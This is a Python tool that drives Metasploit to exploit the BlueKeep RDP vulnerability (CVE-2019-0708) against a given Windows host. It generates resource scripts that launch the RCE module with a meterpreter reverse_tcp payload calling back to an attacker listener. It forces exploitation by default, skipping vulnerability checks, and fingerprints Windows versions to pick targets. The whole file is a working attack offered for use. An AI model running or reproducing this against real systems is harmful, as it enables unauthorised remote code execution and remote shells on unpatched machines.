#!/usr/bin/env python3

import os
import sys
import argparse
import subprocess
import time
import random
import string

def generate_rc_script(target_ip, target_port, payload="windows/x64/meterpreter/reverse_tcp", 
                      lhost="127.0.0.1", lport=4444, target_id=2, force_exploit=False):
    """Generate a Metasploit resource script for BlueKeep exploitation."""
    script_name = f"bluekeep_msf_{random.randint(1000, 9999)}.rc"
    
    with open(script_name, "w") as f:
        f.write(f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
        f.write(f"set RHOSTS {target_ip}\n")
        f.write(f"set RPORT {target_port}\n")
        f.write(f"set TARGET {target_id}\n")
        f.write(f"set PAYLOAD {payload}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        
        # Add force exploit option if requested
        if force_exploit:
            f.write(f"set ForceExploit true\n")
            f.write(f"set AutoCheck false\n")
        
        f.write(f"exploit\n")
    
    print(f"[+] Created Metasploit resource script: {script_name}")
    return script_name

def run_metasploit(script_name, verbose=False):
    """Run Metasploit with the generated resource script."""
    print("[*] Launching Metasploit Framework...")
    
    # Always run in foreground mode to see live output
    cmd = ["msfconsole", "-q", "-r", script_name]
    
    try:
        print("[*] Executing command: " + " ".join(cmd))
        print("[*] This may take several minutes. Please be patient...")
        print("[*] If there's no response, check your connectivity to the target")
        print("[*] Press Ctrl+C to cancel at any time\n")
        
        # Always run in foreground to see output
        subprocess.run(cmd)
        return True
    except FileNotFoundError:
        print("[-] Error: Metasploit Framework (msfconsole) not found.")
        print("[*] Please install Metasploit Framework first:")
        print("    sudo apt update && sudo apt install metasploit-framework")
        return False
    except Exception as e:
        print(f"[-] Error running Metasploit: {e}")
        return False

def check_metasploit_installed():
    """Check if Metasploit is installed on the system."""
    try:
        result = subprocess.run(
            ["which", "msfconsole"], 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        return result.returncode == 0
    except:
        return False

def run_vulnerability_scan(target_ip, target_port=3389, verbose=False):
    """Run a vulnerability scan against the target using Metasploit."""
    print(f"[*] Scanning {target_ip}:{target_port} for BlueKeep vulnerability...")
    
    # Create a temporary resource script for scanning
    scan_script_name = f"bluekeep_scan_{random.randint(1000, 9999)}.rc"
    
    with open(scan_script_name, "w") as f:
        f.write("use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\n")
        f.write(f"set RHOSTS {target_ip}\n")
        f.write(f"set RPORT {target_port}\n")
        f.write("run\n")
        f.write("exit\n")
    
    print("[*] Running vulnerability scan...")
    cmd = ["msfconsole", "-q", "-r", scan_script_name]
    
    try:
        process = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Remove the resource script
        if os.path.exists(scan_script_name):
            os.remove(scan_script_name)
        
        # Check the output for vulnerability detection
        output = process.stdout
        if verbose:
            print("[*] Scan output:")
            print(output)
        
        if "VULNERABLE" in output:
            print(f"[+] {target_ip}:{target_port} is VULNERABLE to BlueKeep!")
            return True
        elif "The target is not exploitable" in output:
            print(f"[-] {target_ip}:{target_port} is NOT vulnerable to BlueKeep")
            return False
        else:
            print(f"[?] Could not determine if {target_ip}:{target_port} is vulnerable")
            return None
    
    except Exception as e:
        print(f"[-] Error during vulnerability scan: {e}")
        if os.path.exists(scan_script_name):
            os.remove(scan_script_name)
        return None

def detect_windows_version(target_ip, target_port=3389, verbose=False):
    """
    Detect the Windows version of the target using RDP fingerprinting.
    Returns the appropriate TARGET ID for Metasploit.
    """
    print(f"[*] Attempting to detect Windows version on {target_ip}:{target_port}...")
    
    # Create a temporary resource script for OS detection
    os_script_name = f"os_detect_{random.randint(1000, 9999)}.rc"
    
    with open(os_script_name, "w") as f:
        f.write("use auxiliary/scanner/rdp/rdp_scanner\n")
        f.write(f"set RHOSTS {target_ip}\n")
        f.write(f"set RPORT {target_port}\n")
        f.write("run\n")
        f.write("exit\n")
    
    try:
        print("[*] Running OS detection scan...")
        cmd = ["msfconsole", "-q", "-r", os_script_name]
        process = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Remove the resource script
        if os.path.exists(os_script_name):
            os.remove(os_script_name)
        
        # Check the output for OS information
        output = process.stdout.lower()
        if verbose:
            print("[*] OS detection output:")
            print(output)
        
        # Determine target ID based on detected OS
        if "windows 7 sp1" in output or "6.1.7601" in output:
            detected_os = "Windows 7 SP1"
            target_id = 1
        elif "windows 7" in output or "6.1.7600" in output:
            detected_os = "Windows 7 SP0"
            target_id = 2
        elif "windows server 2008 r2 sp1" in output or "windows 2008 r2 sp1" in output:
            detected_os = "Windows Server 2008 R2 SP1"
            target_id = 3
        elif "windows server 2008 r2" in output or "windows 2008 r2" in output:
            detected_os = "Windows Server 2008 R2 SP0"
            target_id = 4
        elif "windows server 2008" in output or "windows 2008" in output:
            detected_os = "Windows Server 2008 SP1"
            target_id = 5
        elif "windows" in output:
            detected_os = "Windows (specific version not identified)"
            target_id = 2  # Default to Windows 7 SP0
        else:
            detected_os = "Unknown (could not determine)"
            target_id = 2  # Default to Windows 7 SP0
        
        print(f"[+] Detected: {detected_os} - using TARGET {target_id}")
        
        # Warning for Server 2008
        if target_id in [3, 4, 5]:
            print(f"[!] Warning: Windows Server 2008 targets require fDisableCam=0 registry setting!")
        
        return target_id
        
    except Exception as e:
        print(f"[-] Error during OS detection: {e}")
        print("[*] Using default TARGET 2 (Windows 7 SP0)")
        if os.path.exists(os_script_name):
            os.remove(os_script_name)
        return 2

def verify_rdp_service(target_ip, target_port=3389, verbose=False):
    """
    Verify that RDP service is actually running on the target before attempting to exploit.
    Returns True if RDP is confirmed, False otherwise.
    """
    print(f"[*] Verifying RDP service on {target_ip}:{target_port}...")
    
    try:
        # Basic port check
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((target_ip, target_port))
        sock.close()
        
        if result != 0:
            print(f"[-] Port {target_port} is closed on {target_ip}")
            print("[!] Cannot proceed with exploit - RDP port is not accessible")
            return False
            
        # Send RDP protocol probe
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, target_port))
        
        # RDP connection request
        rdp_probe = bytes.fromhex("0300000b06e00000000000")
        sock.send(rdp_probe)
        
        try:
            response = sock.recv(1024)
            if verbose:
                print(f"[DEBUG] RDP probe response: {response.hex()}")
                
            if len(response) > 0 and response[0:1] == b'\x03':  # RDP protocol signature
                print(f"[+] RDP service confirmed on {target_ip}:{target_port}")
                sock.close()
                return True
            else:
                print(f"[-] Received response but it does not appear to be RDP")
                if verbose:
                    print(f"[DEBUG] Response hex: {response.hex()}")
                    
                sock.close()
                return False
        except socket.timeout:
            print(f"[-] Timeout waiting for response from {target_ip}")
            sock.close()
            return False
    except Exception as e:
        print(f"[-] Error verifying RDP service: {e}")
        return False

def parse_arguments():
    parser = argparse.ArgumentParser(description="BlueKeep Exploit - Metasploit Runner")
    parser.add_argument("-i", "--rhost", required=True, help="Target IP address")
    parser.add_argument("-p", "--rport", type=int, default=3389, help="Target RDP port (default: 3389)")
    parser.add_argument("-l", "--lhost", required=False, help="Local host for reverse connection (default: auto-detect)")
    parser.add_argument("-o", "--lport", type=int, default=4444, help="Local port for reverse connection (default: 4444)")
    parser.add_argument("-t", "--target", type=int, choices=range(0, 6), default=2, 
                      help="Target ID (0: auto, 1: Win7 SP1, 2: Win7 SP0, 3: Win2008 R2 SP1, 4: Win2008 R2 SP0, 5: Win2008 SP1). Default: 2")
    parser.add_argument("-P", "--payload", default="windows/x64/meterpreter/reverse_tcp", 
                      help="Metasploit payload (default: windows/x64/meterpreter/reverse_tcp)")
    parser.add_argument("-f", "--force", action="store_true", default=True, 
                      help="Force exploitation even if target appears invulnerable (default: True)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-d", "--debug", action="store_true", help="Debug mode: Show extra diagnostic information")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan target for vulnerability before exploitation")
    parser.add_argument("--scan-only", action="store_true", help="Only scan for vulnerability, don't exploit")
    parser.add_argument("-A", "--auto-target", action="store_true", 
                      help="Automatically detect OS version and select appropriate target")
    parser.add_argument("--check-rdp", action="store_true", help="Verify RDP service before exploitation")
    return parser.parse_args()

def main():
    banner = """
    __  ___     __                      __      _ __   ____  __           __ __                
   /  |/  /__  / /_____ _____________  / /___  (_) /_ / __ )/ /_  _____  / //_/__  ___ ____   
  / /|_/ / _ \/ __/ __ `/ ___/ ___/ / / / __ \/ / __// __  / / / / / _ \/ ,< / _ \/ -_) __/   
 / /  / /  __/ /_/ /_/ (__  |__  ) /_/ / /_/ / / /_ / /_/ / /___/ /  __/ /| /  __/\__/_/      
/_/  /_/\___/\__/\__,_/____/____/\__,_/ .___/_/\__//_____/_____/_/\___/_/ |_\___/             
                                     /_/                                                      
                                                        
 CVE-2019-0708 BlueKeep Exploit - Metasploit Version
 Target: Windows 2003/XP/Vista/7/Server 2008
 """
    
    print(banner)
    
    # Parse arguments
    args = parse_arguments()
    
    # Check if Metasploit is installed
    if not check_metasploit_installed():
        print("[-] Error: Metasploit Framework (msfconsole) not found.")
        print("[*] Please install Metasploit Framework first:")
        print("    sudo apt update && sudo apt install metasploit-framework")
        sys.exit(1)
    
    # Debug information about environment
    if args.debug:
        print("[DEBUG] System information:")
        try:
            subprocess.run(["uname", "-a"], check=True)
            print("[DEBUG] Network interfaces:")
            subprocess.run(["ip", "addr"], check=True)
            print("[DEBUG] Checking connection to target:")
            subprocess.run(["ping", "-c", "3", args.rhost], check=False)
            print("[DEBUG] Checking if target port is open:")
            subprocess.run(["nc", "-zv", args.rhost, str(args.rport)], check=False)
        except Exception as e:
            print(f"[DEBUG] Error during diagnostics: {e}")
    
    # Auto-detect local IP if not provided
    lhost = args.lhost
    if not lhost:
        try:
            # This creates a socket and connects to an external address to determine local IP
            s = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
            lhost = s.stdout.strip().split()[0]
            print(f"[*] Auto-detected local IP: {lhost}")
        except:
            print("[-] Failed to auto-detect local IP. Please specify with -l/--lhost")
            sys.exit(1)
    
    # Auto-detect target OS if requested
    if args.auto_target:
        print("[*] Auto-target mode enabled")
        detected_target = detect_windows_version(args.rhost, args.rport, args.verbose)
        args.target = detected_target
        print(f"[*] Using detected TARGET ID: {args.target}")
    
    # Display configuration
    print(f"[*] Target: {args.rhost}:{args.rport}")
    print(f"[*] Local handler: {lhost}:{args.lport}")
    print(f"[*] Payload: {args.payload}")
    print(f"[*] Target ID: {args.target}")
    print(f"[*] Force Exploit: {'Yes' if args.force else 'No'}")
    
    # Map target ID to descriptive name
    target_names = {
        0: "Automatic targeting",
        1: "Windows 7 SP1 (6.1.7601 x64)",
        2: "Windows 7 SP0 (6.1.7600 x64) [RECOMMENDED]",
        3: "Windows Server 2008 R2 SP1 (6.1.7601 x64)",
        4: "Windows Server 2008 R2 SP0 (6.1.7600 x64)",
        5: "Windows Server 2008 SP1 (6.0.6001 x64)"
    }
    print(f"[*] Target OS: {target_names.get(args.target, 'Unknown')}")
    
    # Warning for Server 2008 targets
    if args.target in [3, 4, 5]:
        print("[!] WARNING: Windows Server 2008 targets require fDisableCam=0 registry setting!")
    
    print()
    
    # Verify RDP service if requested
    if args.check_rdp or args.debug:
        import socket  # Import here to avoid potential issues if not needed
        if not verify_rdp_service(args.rhost, args.rport, args.verbose or args.debug):
            if input("RDP service verification failed. Continue anyway? (y/n): ").lower() != 'y':
                print("[*] Exiting without exploitation")
                return
            else:
                print("[!] Continuing despite RDP verification failure")
    
    # Run vulnerability scan if requested
    if args.scan or args.scan_only:
        scan_result = run_vulnerability_scan(args.rhost, args.rport, args.verbose)
        
        if args.scan_only:
            print("[*] Scan-only mode, exiting without exploitation")
            return
        
        if scan_result is False and not args.force:
            print("[-] Target appears to be not vulnerable. Use --force to exploit anyway.")
            if input("Continue with exploitation anyway? (y/n): ").lower() != 'y':
                print("[*] Exiting without exploitation")
                return
    
    try:
        # Generate the resource script
        script_name = generate_rc_script(args.rhost, args.rport, args.payload, lhost, args.lport, args.target, args.force)
        
        # Add verbose option to show script content
        if args.verbose:
            print("[*] Resource script content:")
            with open(script_name, "r") as f:
                print(f.read())
            
            # Ask if the user wants to run immediately or manually
            if input("\nRun Metasploit now? (y/n): ").lower() != 'y':
                print(f"\n[*] Resource script created: {script_name}")
                print(f"[*] You can run it manually with: msfconsole -r {script_name}")
                return
        
        # Run Metasploit
        print("[*] Starting Metasploit exploitation...")
        success = run_metasploit(script_name, args.verbose)
        
        # Clean up the resource script
        if os.path.exists(script_name) and not args.verbose:
            os.remove(script_name)
            print(f"[+] Removed temporary resource script: {script_name}")
        
        if success:
            print("\n[+] Metasploit execution completed.")
        else:
            print("\n[-] Metasploit execution failed.")
            
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] An unexpected error occurred: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
